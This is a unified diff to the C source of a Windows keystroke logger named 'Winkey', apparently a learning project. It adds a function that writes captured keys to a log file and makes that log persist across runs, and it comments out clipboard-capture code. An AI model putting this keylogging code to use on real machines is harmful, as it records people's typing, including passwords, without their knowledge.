@@ -44,6 +44,35 @@ void LogNewKbdFocus(HANDLE hFile, HWND hwnd)
     WriteFile(hFile, logBuffer, szLogBuffer, NULL, NULL);
 }
 
+void LogKeystroke(HANDLE hFile, TCHAR c)
+{
+    LPCTSTR output;
+    TCHAR   buffer[2] = {0};
+    size_t  szWrite;
+
+    switch (c)
+    {
+    case 0x08:
+        output = TEXT("[BACKSPACE]");
+        break;
+    case 0x0A:
+        output = TEXT("[ENTER]");
+        break;
+    case 0x0D:
+        output = TEXT("[ENTER]");
+        break;
+    case 0x1B:
+        output = TEXT("[ESC]");
+        break;
+    default:
+        buffer[0] = c;
+        output    = buffer;
+        break;
+    }
+    StringCbLength(output, 4, &szWrite);
+    WriteFile(hFile, output, szWrite, NULL, NULL);
+}
+
 void WinEventproc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd,
                   LONG idObject, LONG idChild, DWORD idEventThread,
                   DWORD dwmsEventTime)
@@ -69,65 +98,65 @@ void WinEventproc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd,
     UNREFERENCED_PARAMETER(dwmsEventTime);
 }
 
-/*
- * @brief Get the clipboard text.
- *
- * @param hwnd The window handle.
- * @return const TCHAR* The clipboard text or NULL.
- */
-const TCHAR* GetClipboardText(HWND hwnd)
-{
-    TCHAR* result  = NULL;
-    TCHAR* pchData = NULL;
-    HANDLE hData   = NULL;
-    size_t szData  = 0;
+// /*
+//  * @brief Get the clipboard text.
+//  *
+//  * @param hwnd The window handle.
+//  * @return const TCHAR* The clipboard text or NULL.
+//  */
+// const TCHAR* GetClipboardText(HWND hwnd)
+// {
+//     TCHAR* result  = NULL;
+//     TCHAR* pchData = NULL;
+//     HANDLE hData   = NULL;
+//     size_t szData  = 0;
 
-    OpenClipboard(hwnd);
-#ifdef UNICODE
-    hData = GetClipboardData(CF_UNICODETEXT);
-#else
-    hData = GetClipboardData(CF_TEXT);
-#endif
-    if (hData == NULL)
-    {
-        goto cleanClipboard;
-    }
-    pchData = (TCHAR*)GlobalLock(hData);
+//     OpenClipboard(hwnd);
+// #ifdef UNICODE
+//     hData = GetClipboardData(CF_UNICODETEXT);
+// #else
+//     hData = GetClipboardData(CF_TEXT);
+// #endif
+//     if (hData == NULL)
+//     {
+//         goto cleanClipboard;
+//     }
+//     pchData = (TCHAR*)GlobalLock(hData);
 
-    if (StringCchLength(pchData, STRSAFE_MAX_CCH, &szData) != S_OK)
-    {
-        goto globalUnlock;
-    }
-    result = malloc(szData * sizeof(TCHAR));
-    if (result == NULL)
-    {
-        goto globalUnlock;
-    }
-    StringCchCopy(result, szData, pchData);
+//     if (StringCchLength(pchData, STRSAFE_MAX_CCH, &szData) != S_OK)
+//     {
+//         goto globalUnlock;
+//     }
+//     result = malloc(szData * sizeof(TCHAR));
+//     if (result == NULL)
+//     {
+//         goto globalUnlock;
+//     }
+//     StringCchCopy(result, szData, pchData);
 
-globalUnlock:
-    GlobalUnlock(hData);
-cleanClipboard:
-    CloseClipboard();
-    return result;
-}
+// globalUnlock:
+//     GlobalUnlock(hData);
+// cleanClipboard:
+//     CloseClipboard();
+//     return result;
+// }
 
-const TCHAR* GetCrtlText(TCHAR c)
-{
-    const TCHAR format[] = TEXT("[CRTL + %c]");
-    size_t      szResult = sizeof(format) + sizeof(TCHAR);
-    TCHAR*      result   = NULL;
+// const TCHAR* GetCrtlText(TCHAR c)
+// {
+//     const TCHAR format[] = TEXT("[CRTL + %c]");
+//     size_t      szResult = sizeof(format) + sizeof(TCHAR);
+//     TCHAR*      result   = NULL;
 
-    result = malloc(szResult);
-    if (result == NULL)
-    {
-        return NULL;
-    }
+//     result = malloc(szResult);
+//     if (result == NULL)
+//     {
+//         return NULL;
+//     }
 
-    StringCchPrintfEx(result, szResult, NULL, NULL, 0, format, c + 'A' - 1);
+//     StringCchPrintfEx(result, szResult, NULL, NULL, 0, format, c + 'A' - 1);
 
-    return result;
-}
+//     return result;
+// }
 
 /**
  * @brief
@@ -172,18 +201,7 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
 {
     if (uMsg == UWM_WINKEY)
     {
-        // const TCHAR* result = NULL;
-
-        // result = GetSpecialKeyValue((TCHAR)wParam);
-        // if (result)
-        // {
-        //     MessageBox(hwnd, result, TEXT("Winkey"), MB_OK);
-        //     free((void*)result);
-        // }
-        // else
-        // {
-        //     MessageBox(hwnd, (LPCTSTR)&wParam, TEXT("Winkey"), MB_OK);
-        // }
+        LogKeystroke(g_hLogFile, (TCHAR)wParam);
     }
     else
     {
@@ -191,7 +209,7 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
         {
         case WM_CREATE:
             g_hLogFile = CreateFile(WINKEY_LOG_FILENAME_TEXT, GENERIC_WRITE,
-                                    FILE_SHARE_READ, NULL, CREATE_ALWAYS,
+                                    FILE_SHARE_READ, NULL, OPEN_ALWAYS,
                                     FILE_ATTRIBUTE_NORMAL, NULL);
             if (g_hLogFile == INVALID_HANDLE_VALUE)
             {
@@ -215,6 +233,7 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
 
             EndPaint(hwnd, &ps);
             break;
+            // I am commenting my code.
         }
         case WM_DESTROY:
             PostQuitMessage(0);
